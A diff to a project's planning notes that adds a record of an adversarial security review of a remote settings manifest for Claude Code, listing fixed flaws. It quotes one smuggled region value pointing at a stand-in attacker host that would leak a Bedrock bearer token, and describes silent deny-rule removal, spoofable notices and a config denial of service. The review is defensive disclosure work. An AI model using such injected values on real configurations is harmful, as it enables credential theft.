@@ -45,6 +45,37 @@ src/manifest/
 - [ ] Publish the manifest itself: `manifest/defaults.json` is served from the repo's `main` via `raw.githubusercontent.com` (PRD §16 Q1 leans this way). Add a CI job that validates `manifest/defaults.json` against `schema.ts` on every push so a bad manifest cannot reach `main`.
 - [ ] README "Network requests" section updated with the manifest URL and the fact that it carries no identifiers.
 
+## Adversarial review (2026-09-11): 16 findings, all fixed
+
+Every one confirmed by reproduction. The worst was a whole-channel compromise:
+
+**`defaults.env` values were type-checked but never content-checked.** The schema
+had `REGION_SHAPE` and applied it rigorously to `regions[]`, but never to
+`defaults.env.AWS_REGION`. A manifest shipping
+`AWS_REGION: "us-east-1.attacker.test:443/v1#"` validated, was written into the
+user's `settings.json`, and Claude Code interpolated it into
+`bedrock-runtime.<region>.amazonaws.com` — sending the user's Bedrock bearer
+token to the attacker's host on every request. The asymmetry is the lesson:
+`credential/validate.ts` already refused exactly this value for the extension's
+*own* test call, so the extension declined to send the token somewhere suspicious
+and then wrote the value into the file for Claude Code to send it. Whitelisting
+which keys we write is not the same as validating what we write into them.
+
+Three more with real teeth: a revision that simply stops listing a `permissions.deny`
+rule removed it with no drift reported and nothing in the panel but "newer settings
+available"; notice rows were pixel-identical to the extension's own advice, so remote
+text could name a real command and an attacker's console; and every collection was
+unbounded, so 20k entries produced a 1 MB settings file — a permanent denial of
+service against Claude Code's own config parse, delivered over the channel and
+surviving removal of the manifest that caused it.
+
+Also two more tests that could not fail: the redirect limit could go 3 → 300 with all
+46 fetch tests green, and a timeout-forwarding test asserted a signal existed then
+hardcoded the number it claimed to observe. Both now mutation-verified, along with
+every new constant in both directions.
+
+Result: 1498 tests, `src/manifest` and `src/health` at 100% lines and branches.
+
 ## Blocker found on 2026-09-11: the manifest URL 404s while the repo is private
 
 `manifest/defaults.json` is now committed on `main` (39ccd62), but
